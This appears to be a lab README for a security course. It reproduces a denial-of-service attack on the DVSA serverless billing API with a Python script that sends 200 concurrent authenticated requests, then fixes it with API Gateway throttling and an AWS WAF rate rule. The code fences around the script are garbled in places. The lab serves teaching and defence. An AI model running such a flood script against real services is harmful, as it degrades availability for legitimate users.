# Lesson 6: Denial of Service (DoS)

---

## 1. Vulnerability Summary

This lesson demonstrates a **Denial of Service (DoS)** vulnerability in the DVSA billing system.

By sending a large number of concurrent requests to the billing API, the backend becomes overloaded, causing:
- Slow response times
- Server errors (500 / 502)
- Failure to serve legitimate users

---

## 2. Impact

- System becomes unstable under load
- Legitimate users cannot complete transactions
- Service availability is compromised

---

## 3. Root Cause

The backend lacked proper request control mechanisms:

- No rate limiting at API Gateway
- No traffic filtering (AWS WAF)
- Unlimited concurrent request handling

This allowed attackers to flood the system with repeated requests.

---

## 4. Environment

- Application: DVSA
- Region: us-east-1
- API Endpoint:
  https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order

- Components:
  - API Gateway
  - AWS Lambda
  - DynamoDB

### Tools Used:
- Python (requests library)
- Browser DevTools (Chrome)
- Postman (optional)

---

## 5. Prerequisites

Before starting:

1. Install Python
2. Install required library:
   pip install requests
3. Have access to DVSA application
4. Have a valid user account

---

## 6. Step-by-Step Reproduction

### Step 1: Create a New Order

1. Open DVSA application
2. Add a product to cart
3. Proceed to checkout
4. Stop at billing page

---

### Step 2: Capture a Valid Request

1. Open DevTools (F12)
2. Go to Network tab
3. Perform billing action
4. Find request:
   POST /dvsa/order

5. Copy:
   - Authorization token
   - Request payload
   - Order ID

---

### Step 3: Test Request in Postman

1. Create POST request:
   ```bash
   https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order
   ```

2. Add headers:
   ```bash
   Authorization: <your_token>
   Content-Type: application/json
    ```
3. Add body:
```bash
{
  "action": "billing",
  "order-id": "<your_order_id>",
  "data": {
    "ccn": "4242424242424242",
    "exp": "03/28",
    "cvv": "123"
  }
}
```
4. Click Send

Expected result:
"order already made"

Evidence:
[Step 3 normal request](/vulnerabilities/lesson6_dos/evidence/step3_normal_request.png)

---

### Step 4: Run DoS Attack Script

Create file:
dos_test.py

Paste the following code:

import threading
import requests

url =  
```bash
 "https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order"
```
headers =
```bash {
    "Authorization": "<your_token>",
    "Content-Type": "application/json"
}
```
```bash
payload = {
    "action": "billing",
    "order-id": "<your_order_id>",
    "data": {
        "ccn": "4242424242424242",
        "exp": "03/28",
        "cvv": "123"
    }
}
```
```bash
def send_request(i):
    try:
        response = requests.post(url, json=payload, headers=headers)
        print(f"{i}: {response.status_code}")
    except Exception:
        print(f"{i}: ERROR")

threads = []

for i in range(200):
    t = threading.Thread(target=send_request, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```
Run:
[python dos_test.py](/vulnerabilities/lesson6_dos/dos_test.py)

---

### Step 5: Observe Attack Result (Before Fix)

Expected:

- Some requests → 200 OK
- Many requests → 500 / 502
- Increased latency

Meaning:
- Backend overloaded
- System becomes unstable

Evidence:
[Step 5 dos attack output](/vulnerabilities/lesson6_dos/evidence/step5_dos_attack_output.png)

---

## 7. Fix Strategy

To prevent DoS attacks:

1. API Gateway Throttling
   - Limit number of requests per second

2. AWS WAF Rate-Based Rules
   - Block repeated requests from same IP
   - Example: 100 requests per 5 minutes

---

## 8. Code / Configuration Changes

- Enabled throttling in API Gateway
- Added AWS WAF rate-based rule

Evidence:
[Api gateway after](/vulnerabilities/lesson6_dos/evidence/api_gateway_after.png)

---

## 9. Verification After Fix

Run again:
python dos_test.py

Expected:
403 Forbidden

Meaning:
- Requests are blocked before reaching backend
- Attack is successfully mitigated


Evidence:
[WAF block](/vulnerabilities/lesson6_dos/evidence/waf_block.png)

---

## 10. Security Analysis

- Vulnerability: Denial of Service (DoS)
- Attack Method: High-volume concurrent requests
- Root Cause: Missing rate limiting and filtering
- Impact: Service instability and downtime
- Fix: API throttling + WAF
- Result: Requests blocked, system stable

---

## 11. Lessons Learned

- Serverless systems require traffic control
- Rate limiting is essential for availability
- WAF provides strong protection against abuse
- Security must include availability, not only data protection

---

## 12. Repository Structure
```
lesson6_dos/
│
├── README.md
├── dos_test.py
└── evidence/
    ├── step3_normal_request.png
    ├── step5_dos_attack_output.png
    ├── waf_block.png
    └── api_gateway_after.png
```
---